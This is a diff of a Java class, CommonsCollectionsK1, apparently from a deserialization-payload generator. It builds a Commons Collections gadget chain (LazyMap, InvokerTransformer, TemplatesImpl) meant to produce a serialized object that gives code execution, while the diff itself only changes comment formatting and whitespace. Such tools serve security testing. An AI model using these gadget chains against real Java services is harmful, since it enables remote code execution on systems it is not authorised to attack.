@@ -13,19 +13,18 @@ import java.util.HashMap;
 import java.util.Map;
 
 /**
-Gadget chain:
-     HashMap
-       TiedMapEntry.hashCode
-         TiedMapEntry.getValue
-           LazyMap.decorate
-             InvokerTransformer
-               templates...
+ * Gadget chain:
+ * HashMap
+ * TiedMapEntry.hashCode
+ * TiedMapEntry.getValue
+ * LazyMap.decorate
+ * InvokerTransformer
+ * templates...
  */
-public class CommonsCollectionsK1 implements ObjectPayload<Object>{
+public class CommonsCollectionsK1 implements ObjectPayload<Object> {
 
     public Object getObject(PayloadType type, String... param) throws Exception {
-        Object tpl = Gadgets.createTemplatesImpl(type, param);
-
+        Object                  tpl         = Gadgets.createTemplatesImpl(type, param);
         InvokerTransformer      transformer = new InvokerTransformer("toString", new Class[0], new Object[0]);
         HashMap<String, String> innerMap    = new HashMap<String, String>();
         Map                     m           = LazyMap.decorate(innerMap, transformer);
